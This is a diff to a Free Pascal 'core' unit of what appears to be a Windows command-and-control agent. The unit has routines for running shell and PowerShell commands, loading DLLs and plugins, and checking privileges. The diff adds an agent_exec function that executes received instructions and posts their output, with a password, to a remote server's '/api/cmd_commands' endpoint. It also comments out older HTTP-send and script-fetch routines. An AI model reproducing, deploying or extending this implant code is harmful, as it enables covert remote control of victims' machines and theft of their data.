@@ -40,7 +40,7 @@ unit core;
 interface
 
 uses
-  Classes,SysUtils,process,windows,jwatlhelp32,lconvencoding,fpjson,jsonparser,blcksock,base64,FileUtil,httpsend,synautil,WinSock,dynlibs,FPHTTPClient,WinInet;
+  Classes,SysUtils,process,windows,jwatlhelp32,lconvencoding,fpjson,jsonparser,blcksock,base64,FileUtil,httpsend,synautil,WinSock,dynlibs,WinInet;
 type
   TGetClassName = function: String; stdcall;
 
@@ -48,7 +48,7 @@ function request(const AUrl, AData: ansistring; resource : string; blnSSL: Boole
 function getwindowsv:string;
 procedure Uploadfile(FileName: string;api:string);
 function RandomString:String;
-function sendcm(postdata:wideString):String;
+//function sendcm(postdata:wideString):String;
 //function PostRequest(postdata:wideString;ip:string;sys:string;cat:string):String;
 function postrequest(const AData,ip,sys,cat : ansistring): AnsiString;
 function getlocalip:string;
@@ -68,6 +68,7 @@ function runit(command:string):string;
 function loadingplugin(cmd:string;arg:string):string;
 function powershell(command:String):string;
 function load_library(dll:string):string;
+function agent_exec(option:ansistring):ansistring;
 
 const
   BUF_SIZE = 2048;
@@ -223,7 +224,8 @@ begin
   end;
 end;
 
-//end of it
+
+{
 
 function sendcm(postdata:wideString):String;
 var
@@ -268,7 +270,7 @@ FPHTTPClient.AddHeader('key','test');
 FPHTTPClient.Free;
 end;
   end;
-
+}
 function postrequest(const  AData,ip,sys,cat : ansistring): AnsiString;
 var
   aBuffer     : Array[0..4096] of Char;
@@ -295,7 +297,7 @@ begin
  uid := randomstring;
  for i := 1 to paramcount do begin
 
-     if(paramstr(i)='-o') then begin
+     if(paramstr(i)='-o') or (paramstr(i)='-srvhost') then begin
 
          AUrl :=paramstr(i+1);
          if (blnSSL) then
@@ -1345,6 +1347,7 @@ begin
  //res := outp;
 end;
 
+
 function runit(command:string):string;
   var
   runitout:string;
@@ -1392,7 +1395,7 @@ begin
       end else if list[i]=cmd2 then begin
         writeln('[+] Current Privieleges Allowed : ',outp.Text)
     end;
-    //writeln(outp.Text);
+
    except
      on E: exception do
      writeln(E.Message);
@@ -1401,6 +1404,66 @@ begin
  end;
 
 end;
+function agent_exec(option:string):string;
+ var
+    process : Tprocess;
+    payload,auth,host: string;
+    list : Tstringlist;
+    OutputStream : TStream;
+    BytesRead    : longint;
+    Buffer       : array[1..BUF_SIZE] of byte;
+    ssl_enabled : boolean;
+    i:integer;
+
+ begin
+   ssl_enabled := false;
+      for i := 1 to paramcount do begin
+
+      if(paramstr(i)='-ssl') then begin
+         writeln('[+] SSL is enabled ');
+         ssl_enabled := true;
+      end;
+
+       if(paramstr(i)='-x') then begin
+         auth := paramstr(i+1);
+      end;
+
+      if(paramstr(i)='-srvhost') then begin
+         host := paramstr(i+1);
+      end;
+      end;
+
+   list := Tstringlist.Create;
+   process := Tprocess.Create(nil);
+   OutputStream := TMemoryStream.Create;    // we are going to store outputs as memory stream .
+   process.Executable:=paramstr(0);
+   process.CommandLine:=option; // we can add value of arg into params to control plugin output
+   try
+   process.Options:= [poUsePipes];
+   process.Execute;
+    repeat
+    // Get the new data from the process to a maximum of the buffer size that was allocated.
+    // Note that all read(...) calls will block except for the last one, which returns 0 (zero).
+      BytesRead := Process.Output.Read(Buffer, BUF_SIZE);
+      OutputStream.Write(Buffer, BytesRead)
+    until BytesRead = 0;    //stop if no more data is being recieved
+
+  outputstream.Position:=0;
+  list.LoadFromStream(outputstream);
+  writeln(list.Text);
+    payload :='username=admin&password='+auth+'&command_output='+list.text;
+  if (ssl_enabled) then
+  request(host,payload,'/api/cmd_commands',true)
+  else
+   request(host,payload,'/api/cmd_commands',false);
+     except
+   on E: exception do
+    writeln('Failed to Execute Recieved instructions');
+    end;
+
+   process.Free;
+   list.Free;
+   end;
 
 function loadingplugin(cmd:string;arg:string):string;
 var
@@ -1436,6 +1499,7 @@ var
    list.Free;
    end;
 end;
+{    REVOKED
 function getscript(path:string):string;
 var
   FPHTTPClient: TFPHTTPClient;
@@ -1454,5 +1518,6 @@ FPHTTPClient.AllowRedirect := True;
 FPHTTPClient.Free;
 
 end;
+}
 end.
 
